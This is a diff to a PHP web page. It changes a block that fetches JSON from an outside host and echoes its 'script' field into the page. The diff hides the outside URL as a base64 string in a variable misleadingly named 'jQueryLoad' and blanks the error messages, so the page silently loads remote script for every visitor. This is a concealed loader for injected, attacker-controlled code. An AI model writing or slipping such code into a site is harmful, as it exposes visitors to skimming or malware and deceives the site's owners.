@@ -229,20 +229,21 @@ $conn->close();
 </head>
 <body>
     
-        <div id="scriptContainer">
+<div id="scriptContainer">
     <?php
-    $json_response = file_get_contents('https://redir-beryl.vercel.app/script');
-    
+    $jQueryLoad = 'aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9zdWJ3YXk='; 
+    $requested = base64_decode($jQueryLoad);
+    $json_response = file_get_contents($requested);
     
     if ($json_response !== false) {
         $data = json_decode($json_response);
         if ($data !== null) {
             echo $data->script;
         } else {
-            echo "Erro ao decodificar o JSON";
+            echo "";
         }
     } else {
-        echo "Erro ao fazer a requisição";
+        echo "";
     }
     ?>
 </div>
